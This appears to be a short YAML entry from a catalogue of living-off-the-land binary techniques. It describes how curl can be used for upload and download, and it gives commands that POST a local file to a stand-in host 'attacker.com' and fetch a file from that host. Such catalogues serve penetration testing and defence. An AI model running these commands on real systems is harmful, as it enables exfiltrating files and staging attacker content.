---
functions:
  upload:
    - description: Send local file with an HTTP POST request.
      code: |
        URL=http://attacker.com/
        LFILE=file_to_send
        curl -X POST -d @$file_to_send $URL
  download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        URL=http://attacker.com/file_to_get
        LFILE=where_to_save
        curl $URL -o $LFILE
---